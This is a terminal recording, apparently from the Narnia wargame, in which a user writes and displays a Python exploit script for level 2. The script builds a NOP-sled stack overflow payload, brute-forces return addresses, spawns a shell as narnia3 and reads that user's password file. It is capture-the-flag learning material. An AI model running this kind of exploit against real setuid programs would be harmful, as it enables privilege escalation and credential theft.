[0.274, "o", "vim -u NONE -N /tmp/e_narnia2.py\r\r\n\u001b[?2004l\r\u001b]3008;start=b77274ac-4f0e-46b5-9402-e09553e58554;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?1049h\u001b[22;0;0t\u001b[>4;2m\u001b[?1h\u001b=\u001b[?2004h\u001b[?1004h\u001b[1;32r\u001b[?12h\u001b[?12l\u001b[22;2t\u001b[22;1t\u001b[27m\u001b[23m\u001b[29m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[32;1H\"/tmp/e_narnia2.py\" [New]\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[3;1H\u001bPzz\u001b\\\u001b[0%m\u001b[6n\u001b[3;1H           \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                                                                                                   \u001b[7;1H~                                                                                                   \u001b[8;1H~                                                                                                   \u001b[9;1H~                                                                                                   \u001b[10;1H~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                                                   \u001b[18;1H~                                                                                                   \u001b[19;1H~                                                                                                   \u001b[20;1H~                                                                                                   \u001b[21;1H~                                                                                                   \u001b[22;1H~                                                                                                   \u001b[23;1H~                                                                                                   \u001b[24;1H~                                                                                                   \u001b[25;1H~                                                                                                   \u001b[26;1H~                                                                                                   \u001b[27;1H~                                                                                                   \u001b[28;1H~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[m\u001b[32;83H0,0-1\u001b[9CAll\u001b[1;1H\u001b[?25h\u001b[?4m"]
[40.325, "o", "$ cat /tmp/e_narnia2.py\r\n\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25limport os, struct, subprocess, sys, time, select\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# 1. The shellcode is NOT hand-typed here.  It was written in /tmp/l2.asm with\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l#    vim and assembled on the lab:\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l#\u001b[8Cnasm -f elf32 /tmp/l2.asm -o /tmp/l2.o\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l#\u001b[8Cobjcopy -O binary --only-section=.text /tmp/l2.o /tmp/l2.bin\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l#    so this script loads the exact bytes nasm produced.\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/l2.bin\", \"rb\").read()\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25lprint(\"== step 1: shellcode taken from the assembler output ==\")\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25lprint(\"   /tmp/l2.bin: %d bytes\" % len(sc))\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25lfor i in range(0, len(sc), 16):\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l    chunk = sc[i:i + 16]\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l    text = \"\".join(chr(c) if 32 <= c < 127 else \".\" for c in chunk)\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25l    print(\"   %04x  %-47s  %s\" % (i, chunk.hex(\" \"), text))\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25lprint(\"   NUL bytes: %d  (argv cannot contain NUL, so this must be 0)\" % sc.count(b\"\\x00\"))\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25lassert 0 not in sc, \"argv cannot contain NUL bytes\"\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25lassert len(sc) <= 128, \"the shellcode must fit in buf[128]\"\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25l\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l# 2. Layout.  main() has:  char buf[128];  strcpy(buf, argv[1]);\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25l#    objdump showed:  lea -0x80(%ebp),%eax ; push %eax ; call strcpy@plt\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25l#    and gdb confirmed buf = ebp-0x80, saved ebp = ebp+0, ret = ebp+4.\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25l#    So argv[1] must be:\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l#\u001b[8C[0 .. 127]   128 bytes filling buf: NOP sled then the shellcode\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25l#\u001b[8C[128 .. 131] saved EBP (4 bytes of filler)\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25l#\u001b[8C[132 .. 135] return address -> a word inside the NOP sled\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25ldef payload_for(addr):\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hp = b\"\\x90\" * (128 - len(sc)) + sc\u001b[10C# sled at the start of buf\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hassert len(p) == 128\u001b[32;83H\u001b[K\u001b[32;83H33,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hreturn p + b\"B\" * 4 + struct.pack(\"<I\", addr)\u001b[32;83H\u001b[K\u001b[32;83H34,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H35,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"== step 2: payload layout (offsets into argv[1]) ==\")\u001b[32;83H\u001b[K\u001b[32;83H36,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   [0..127]   128-byte buf: %d NOPs then %d-byte shellcode\" % (128 - len(sc), len(sc)))\u001b[32;83H\u001b[K\u001b[32;83H37,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   [128..131] saved EBP = 'BBBB'\")\u001b[32;83H\u001b[K\u001b[32;83H38,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   [132..135] return address, little-endian\")\u001b[32;83H\u001b[K\u001b[32;83H39,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H40,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Henv = {k.encode(): v.encode() for k, v in os.environ.items()}\u001b[32;83H\u001b[K\u001b[32;83H41,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[3"]
[0.000, "o", "1;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H42,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# ---------------------------------------------------------------------------\u001b[32;83H\u001b[K\u001b[32;83H43,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# 3. Probe one candidate address: fork, run narnia2 with the payload, capture\u001b[32;83H\u001b[K\u001b[32;83H44,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    output, and look for the marker the shellcode writes first.\u001b[32;83H\u001b[K\u001b[32;83H45,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#\u001b[32;83H\u001b[K\u001b[32;83H46,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;1H#    Important subtlety: narnia2 itself does printf(\"%s\", buf), so the raw\r\r\n#    payload -- including the bytes \"PWN!\" that sit inside the shellcode -- is\u001b[32;83H\u001b[K\u001b[32;83H48,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    echoed even when the return address does NOT land in the sled.  A naive\u001b[32;83H\u001b[K\u001b[32;83H49,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    \"PWN!\" search therefore reports a hit on every address.  The real signal\u001b[32;83H\u001b[K\u001b[32;83H50,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    is that the process does NOT crash: with a working return address the\u001b[32;83H\u001b[K\u001b[32;83H51,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    shellcode runs, prints its marker and replaces the process with /bin/sh,\u001b[32;83H\u001b[K\u001b[32;83H52,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    so the exit status is not a signal death.\u001b[32;83H\u001b[K\u001b[32;83H53,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# ---------------------------------------------------------------------------\u001b[32;83H\u001b[K\u001b[32;83H54,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hdef probe(addr):\u001b[32;83H\u001b[K\u001b[32;83H55,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H\"\"\"Run narnia2 with the payload and ask the shell it should spawn to\u001b[32;83H\u001b[K\u001b[32;83H56,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hanswer.  Requiring a real reply rules out two false positives:\u001b[32;83H\u001b[K\u001b[32;83H57,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;7H* printf(\"%s\", buf) echoes the payload, which already contains \"PWN!\";\u001b[32;83H\u001b[K\u001b[32;83H58,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;7H* a return address landing on 'A' (0x41) or 'B' (0x42) bytes executes\u001b[32;83H\u001b[K\u001b[32;83H59,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hharmless increments and can exit without crashing.\u001b[32;83H\u001b[K\u001b[32;83H60,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5HOnly a reply from /bin/sh proves the shellcode actually ran.\u001b[32;83H\u001b[K\u001b[32;83H61,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H\"\"\"\u001b[32;83H\u001b[K\u001b[32;83H62,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5H# argv cannot contain a NUL byte, so skip addresses whose encoding has one\u001b[32;83H\u001b[K\u001b[32;83H63,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif 0 in struct.pack(\"<I\", addr):\u001b[32;83H\u001b[K\u001b[32;83H64,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hreturn False\u001b[32;83H\u001b[K\u001b[32;83H65,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Htry:\u001b[32;83H\u001b[K\u001b[32;83H66,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hp = subprocess.Popen([b\"/narnia/narnia2\", payload_for(addr)],\u001b[32;83H\u001b[K\u001b[32;83H67,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;30Hstdin=subprocess.PIPE, stdout=subprocess.PIPE,\u001b[32;83H\u001b[K\u001b[32;83H68,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;30Hstderr=subprocess.STDOUT, env=env)\u001b[32;83H\u001b[K\u001b[32;83H69,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hout, _ = p.communicate(b\"echo PROBE_OK\\n\", timeout=2)\u001b[32;83H\u001b[K\u001b[32;83H70,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hexcept subprocess.TimeoutExpired:\u001b[32;83H\u001b[K\u001b[32;83H71,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hp.kill()\u001b[32;83H\u001b[K\u001b[32;83H72,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hp.communicate()\u001b[32;83H\u001b[K\u001b[32;83H73,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30"]
[0.000, "o", ";9Hreturn False\u001b[32;83H\u001b[K\u001b[32;83H74,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hreturn b\"PROBE_OK\" in out\u001b[32;83H\u001b[K\u001b[32;83H75,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H76,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"== step 3: sweep return addresses, looking for the marker ==\")\u001b[32;83H\u001b[K\u001b[32;83H77,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   the stack is executable (readelf: GNU_STACK RWE) and ASLR is off,\")\u001b[32;83H\u001b[K\u001b[32;83H78,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   so the shellcode can sit in argv[1] on the stack itself.\")\u001b[32;83H\u001b[K\u001b[32;83H79,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfound = None\u001b[32;83H\u001b[K\u001b[32;83H80,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Ht0 = time.time()\u001b[32;83H\u001b[K\u001b[32;83H81,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hfor addr in range(0xffffd000, 0xffffe800, 4):\u001b[32;83H\u001b[K\u001b[32;83H82,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hif probe(addr):\u001b[32;83H\u001b[K\u001b[32;83H83,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hfound = addr\u001b[32;83H\u001b[K\u001b[32;83H84,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;9Hprint(\"   HIT at %#x after %d probes (%.1f s)\" % (addr, (addr - 0xffffd000) // 4 + 1, time.tt\u001b[30;1Hime() - t0))\u001b[32;83H\u001b[K\u001b[32;83H85,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;9Hbreak\u001b[32;83H\u001b[K\u001b[32;83H86,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hif found is None:\u001b[32;83H\u001b[K\u001b[32;83H87,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hprint(\"   no address landed in the sled\")\u001b[32;83H\u001b[K\u001b[32;83H88,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hsys.exit(1)\u001b[32;83H\u001b[K\u001b[32;83H89,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H90,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hpl = payload_for(found)\u001b[32;83H\u001b[K\u001b[32;83H91,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"== step 4: final payload (%d bytes) ==\" % len(pl))\u001b[32;83H\u001b[K\u001b[32;83H92,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   ret = %#x  -> points into the NOP sled at buf+%d\" % (found, 0))\u001b[32;83H\u001b[K\u001b[32;83H93,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[1;1H\u001b[2M\u001b[1;32r\u001b[29;1Hprint(\"   %s ... %s | %s | %s\" % (pl[:4].hex(\" \"), pl[124:128].hex(\" \"), pl[128:132].hex(\" \"), pl[133\u001b[30;1H2:136].hex(\" \")))\u001b[32;83H\u001b[K\u001b[32;83H94,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"   first 8 bytes: %s   (0x90 = NOP)\" % pl[:8].hex(\" \"))\u001b[32;83H\u001b[K\u001b[32;83H95,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H96,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# ---------------------------------------------------------------------------\u001b[32;83H\u001b[K\u001b[32;83H97,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# 5. Confirm the winning address once more, with the real commands, so the\u001b[32;83H\u001b[K\u001b[32;83H98,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H#    transcript shows the shell running as narnia3.\u001b[32;83H\u001b[K\u001b[32;83H99,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H# ---------------------------------------------------------------------------\u001b[32;83H\u001b[K\u001b[32;83H100,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"== step 5: run the winning address and use the shell ==\")\u001b[32;83H\u001b[K\u001b[32;83H101,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hp = subprocess.Popen([b\"/narnia/narnia2\", payload_for(found)],\u001b[32;83H\u001b[K\u001b[32;83H102,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;22Hstdin=subprocess.PIPE, stdout=subprocess.PIPE,\u001b[32;83H\u001b[K\u001b[32;83H103,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;22Hstderr=subprocess.STDOUT, env=env)\u001b[32;83H\u001b[K\u001b[32;83H104,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hout, _ = p.communicate(b\"id\\ncat /etc/narnia_pass/narnia3\\n\", timeout=5)\u001b[32;83H\u001b[K\u001b[32;83H105,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(out.decode(\"latin-1\"), flush=True)\u001b[32;83H\u001b[K\u001b[32;83H106,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b"]
[0.000, "o", "[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hif b\"narnia3\" not in out:\u001b[32;83H\u001b[K\u001b[32;83H107,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hprint(\"   the address did not give a working shell\")\u001b[32;83H\u001b[K\u001b[32;83H108,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hsys.exit(1)\u001b[32;83H\u001b[K\u001b[32;83H109,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hprint(\"== done: the shell ran as narnia3 ==\")\u001b[32;83H\u001b[K\u001b[32;83H110,1\u001b[9CBot\u001b[31;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H110,0-1\u001b[7CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/e_narnia2.py\" [New] 110L, 5579B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=b77274ac-4f0e-46b5-9402-e09553e58554;exit=success\u001b\\\u001b]3008;start=fb767b35-ec89-450c-b9d7-21327b2c6b7a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?2004h\u001b]0;narnia2@narnia: ~\u0007narnia2@narnia:~$ $ python3 /tmp/e_narnia2.py\r\n"]
[0.374, "o", "cat /tmp/e_narnia2.py\r\r\n\u001b[?2004l\r\u001b]3008;start=ab2107cc-0b85-407a-86ea-dfa822a25ba7;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\"]
[0.056, "o", "import os, struct, subprocess, sys, time, select\r\r\n\r\r\n# ---------------------------------------------------------------------------\r\r\n# 1. The shellcode is NOT hand-typed here.  It was written in /tmp/l2.asm with\r\r\n#    vim and assembled on the lab:\r\r\n#        nasm -f elf32 /tmp/l2.asm -o /tmp/l2.o\r\r\n#        objcopy -O binary --only-section=.text /tmp/l2.o /tmp/l2.bin\r\r\n#    so this script loads the exact bytes nasm produced.\r\r\n# ---------------------------------------------------------------------------\r\r\nsc = open(\"/tmp/l2.bin\", \"rb\").read()\r\r\nprint(\"== step 1: shellcode taken from the assembler output ==\")\r\r\nprint(\"   /tmp/l2.bin: %d bytes\" % len(sc))\r\r\nfor i in range(0, len(sc), 16):\r\r\n    chunk = sc[i:i + 16]\r\r\n    text = \"\".join(chr(c) if 32 <= c < 127 else \".\" for c in chunk)\r\r\n    print(\"   %04x  %-47s  %s\" % (i, chunk.hex(\" \"), text))\r\r\nprint(\"   NUL bytes: %d  (argv cannot contain NUL, so this must be 0)\" % sc.count(b\"\\x00\"))\r\r\nassert 0 not in sc, \"argv cannot contain NUL bytes\"\r\r\nassert len(sc) <= 128, \"the shellcode must fit in buf[128]\"\r\r\n\r\r\n# ---------------------------------------------------------------------------\r\r\n# 2. Layout.  main() has:  char buf[128];  strcpy(buf, argv[1]);\r\r\n#    objdump showed:  lea -0x80(%ebp),%eax ; push %eax ; call strcpy@plt\r\r\n#    and gdb confirmed buf = ebp-0x80, saved ebp = ebp+0, ret = ebp+4.\r\r\n#    So argv[1] must be:\r\r\n#        [0 .. 127]   128 bytes filling buf: NOP sled then the shellcode\r\r\n#        [128 .. 131] saved EBP (4 bytes of filler)\r\r\n#        [132 .. 135] return address -> a word inside the NOP sled\r\r\n# ---------------------------------------------------------------------------\r\r\ndef payload_for(addr):\r\r\n    p = b\"\\x90\" * (128 - len(sc)) + sc          # sled at the start of buf\r\r\n    assert len(p) == 128\r\r\n    return p + b\"B\" * 4 + struct.pack(\"<I\", addr)\r\r\n\r\r\nprint(\"== step 2: payload layout (offsets into argv[1]) ==\")\r\r\nprint(\"   [0..127]   128-byte buf: %d NOPs then %d-byte shellcode\" % (128 - len(sc), len(sc)))\r\r\nprint(\"   [128..131] 